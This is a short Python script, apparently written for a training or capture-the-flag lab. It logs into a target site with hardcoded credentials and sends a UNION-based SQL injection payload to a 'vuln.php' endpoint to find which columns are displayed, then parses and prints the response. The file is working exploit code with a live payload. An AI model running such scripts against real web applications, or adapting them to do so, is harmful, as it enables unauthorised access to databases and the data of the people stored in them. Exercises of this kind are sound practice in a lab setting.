import sys, re, requests, html
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
A = "http://xebec.cylabacademy.net:47074"
U, P = "hx8105", "Passw0rd!"
s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0"})
s.post(A + "/login.php", data={"username": U, "password": P}, timeout=20, allow_redirects=True)


def q(payload):
    r = s.get(A + "/vuln.php", params={"q": payload}, timeout=20)
    body = r.text
    # isoler la zone resultats (apres le formulaire)
    body2 = re.sub(r"<script.*?</script>", " ", body, flags=re.S)
    txt = re.sub(r"<[^>]+>", "\n", body2)
    txt = html.unescape(txt)
    lines = [l.strip() for l in txt.split("\n") if l.strip()]
    return r.status_code, len(body), lines


print("=== UNION 1,2 (colonnes visibles) ===")
code, ln, lines = q("' UNION SELECT 1,2-- -")
print("taille:", ln)
for l in lines[:25]:
    print("  ", l[:160])
